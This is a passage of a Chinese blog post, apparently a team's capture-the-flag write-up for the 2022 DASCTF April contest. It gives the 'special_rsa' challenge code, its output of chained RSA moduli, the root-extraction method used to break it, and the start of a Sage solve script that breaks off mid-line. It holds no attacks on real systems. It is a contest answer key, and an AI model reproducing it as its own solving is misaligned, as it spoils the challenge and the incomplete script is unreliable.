<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="200x200" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon32.ico">
  <link rel="icon" type="image/ico" sizes="16x16" href="/images/favicon16.ico">
  <link rel="mask-icon" href="/images/hackerrank.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"harry0597.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="NEFU-NSILAB下Maple战队分队于4月23日10:00 - 18:00所产WriteUp">
<meta property="og:type" content="article">
<meta property="og:title" content="2022DASCTF Apr X FATE 防疫挑战赛WP">
<meta property="og:url" content="https://harry0597.com/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/index.html">
<meta property="og:site_name" content="Harry&#39;s Blog">
<meta property="og:description" content="NEFU-NSILAB下Maple战队分队于4月23日10:00 - 18:00所产WriteUp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115701837.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115549485.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115837848.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115900240.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220425230421404.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002438607.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002311486.png">
<meta property="og:image" content="https://s2.loli.net/2022/04/23/FMmAZp8UeS2Nunq.png">
<meta property="article:published_time" content="2022-04-24T03:53:23.000Z">
<meta property="article:modified_time" content="2022-04-26T03:52:51.083Z">
<meta property="article:author" content="Harry0597">
<meta property="article:tag" content="Writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115701837.png">

<link rel="canonical" href="https://harry0597.com/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2022DASCTF Apr X FATE 防疫挑战赛WP | Harry's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Harry's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">温故知新</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Harry0597" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://harry0597.com/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/IMG_2550.JPG">
      <meta itemprop="name" content="Harry0597">
      <meta itemprop="description" content="Pondering'll do you wonders.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Harry's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2022DASCTF Apr X FATE 防疫挑战赛WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-24 11:53:23" itemprop="dateCreated datePublished" datetime="2022-04-24T11:53:23+08:00">2022-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-26 11:52:51" itemprop="dateModified" datetime="2022-04-26T11:52:51+08:00">2022-04-26</time>
              </span>

          
    <span>&emsp;</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span>
    <span class="post-meta-item-text">阅读次数：</span>
    <span id="busuanzi_value_page_pv"></span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>64k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>58 分钟</span>
            </span>
            <div class="post-description">NEFU-NSILAB下Maple战队分队于4月23日10:00 - 18:00所产WriteUp</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="队伍信息"><a href="#队伍信息" class="headerlink" title="队伍信息"></a>队伍信息</h1><ul>
<li><p>名称：村通网队</p>
</li>
<li><p>成员：4人</p>
<p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115701837.png" alt="Members"></p>
</li>
<li><p>排名：30</p>
<p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115549485.png" alt="rank"></p>
</li>
</ul>
<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><ul>
<li><p>2道Crypto，总3道</p>
</li>
<li><p>2道Misc， 总5道<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115837848.png" alt="detail"></p>
</li>
<li><p>其中Crypto方向第8名<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220424115900240.png" alt="Rank for crypto"></p>
</li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="special-rsa"><a href="#special-rsa" class="headerlink" title="special_rsa"></a>special_rsa</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPrime1</span>(<span class="params">bitLength, e</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = getPrime(bitLength)</span><br><span class="line">        <span class="keyword">if</span> (i - <span class="number">1</span>) % e ** <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">flag=<span class="string">b&#x27;DASCTF&#123;????????????????????&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">lenth = ((<span class="built_in">len</span>(<span class="built_in">bin</span>(m)) - <span class="number">2</span>) // <span class="number">2</span>) + <span class="number">9</span></span><br><span class="line">e=<span class="number">113</span></span><br><span class="line">p = getPrime1(lenth, e)</span><br><span class="line">q = getPrime1(lenth, e)</span><br><span class="line">n=p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    lenth = ((<span class="built_in">len</span>(<span class="built_in">bin</span>(c)) - <span class="number">2</span>) // <span class="number">2</span>) + <span class="number">9</span></span><br><span class="line">    p = getPrime1(lenth, e)</span><br><span class="line">    q = getPrime1(lenth, e)</span><br><span class="line">    n=p*q</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    c=<span class="built_in">pow</span>(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># output.txt</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line"><span class="attr">e</span>=<span class="number">113</span></span><br><span class="line"><span class="attr">c</span>=<span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br></pre></td></tr></table></figure>

<p>可知</p>
<ul>
<li><p>flag被rsa加密后产生的密文C 就是 下次一次加密的明文，即：<strong>循环加密密文</strong></p>
</li>
<li><p>附件给出了e、所有的n 、最后的C</p>
</li>
<li><p>根据n，利用分解网站依次写出对应p、q</p>
</li>
<li><p>由p、q生成过程发现，e|(q-1) 且 e|(p-1)</p>
<p>简单的e，phi不互素不能处理gcd(e, phi) = e的情况</p>
<p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">参考</a>以下原理</p>
<blockquote>
<p>e 和 p−1 （或 q−1）的最大公约数就是 e 本身，也就是说 e∣(p−1)，只有对 c 开 e 次方根才行。</p>
<p>可以将同余方程 m^e ≡ c (modn) 化成</p>
<p>m^e ≡ c (modp)</p>
<p>m^e ≡ c (modq)</p>
<p>然后分别在 GF(p) 和 GF(q) 上对 c 开 e 次方根，再用CRT组合一下即可得到在 modn 下的解。</p>
<p>问题是，<strong>如何在有限域内开根</strong>？</p>
<p>这里 e 与 p−1 和 q−1 都不互素，不能简单地求个逆元就完事。</p>
<p>这种情况下，<strong>开平方根</strong>可以用<code>Tonelli–Shanks algorithm</code>，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tonelli%E2%80%93Shanks_algorithm">Wiki</a>说这个算法可以<strong>扩展到开n次方根</strong>。</p>
<p>在这篇<a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1111.4877.pdf">paper</a>里给出了具体的算法：<code>Adleman-Manders-Miller rth Root Extraction Method</code>。</p>
<p>这个算法只能开出一个根，实际上开 e 次方，最多会有 e 个根（这题的情况下有0x1337个根）。</p>
<p>如何找到其他根？</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6752374/cube-root-modulo-p-how-do-i-do-this">StackOverflow – Cube root modulo P</a> 给出了方法。</p>
<p>如何找到所有的<code>primitive 0x1337th root of 1</code>?</p>
<p><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field">StackExchange – Finding the n-th root of unity in a finite field</a> 给出了方法。</p>
<p><strong>Exploit</strong>（以 <code>e=0x1337</code> 为例）</p>
<ul>
<li>先用<code>Adleman-Manders-Miller rth Root Extraction Method</code>在 GF(p) 和 GF(q) 上对 c 开 e 次方根，分别得到一个解。大概不到10秒。</li>
<li>然后去找到所有的<code>0x1336</code>个<code>primitive nth root of 1</code>，乘以上面那个解，得到所有的<code>0x1337</code>个解。大概1分钟。</li>
<li>再用CRT对 GF(p) 和 GF(q) 上的两组<code>0x1337</code>个解组合成 modn 下的解，可以得到<code>0x1337**2=24196561</code>个 modn 的解。最后能通过<code>check()</code>的即为flag。大概十几分钟。</li>
</ul>
</blockquote>
<p>解出后，发现不止一个解，需要初步筛选</p>
<p>由c = m^e mod n 原理 以及 循环加密的逻辑，不难发现<strong>解出来的 m    得小于  上一个n</strong></p>
<p>即使加上以上限定条件，仍有些m解出来不只1个</p>
<p>所以，当解到一组无解时，需要更换 无解这组之前的m（<strong>下面会用 列表表示  每次解得的 所有符合条件的m</strong></p>
<p>直到打印出预期的c0 (flag加密得来)</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">#脚本<span class="number">2</span></span><br><span class="line">#Sage</span><br><span class="line"></span><br><span class="line">n0 = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line">n1 = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line">n2 = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line">n3 = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line">n4 = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line">n5 = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line">n6 = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line">n7 = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line">n8 = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line">n9 = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line">n10 = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line">n11 = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line">n12 = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line">n13 = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line">n14 = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line">n15 = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line">n16 = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line">n17 = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line">n18 = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line">n19 = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line">n20 = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line">n21 = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line">n22 = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line">n23 = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line">n24 = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line">n25 = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line">n26 = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line">c = <span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br><span class="line"></span><br><span class="line">p26 = <span class="number">978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span></span><br><span class="line">q26 = <span class="number">1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span></span><br><span class="line">p25 = <span 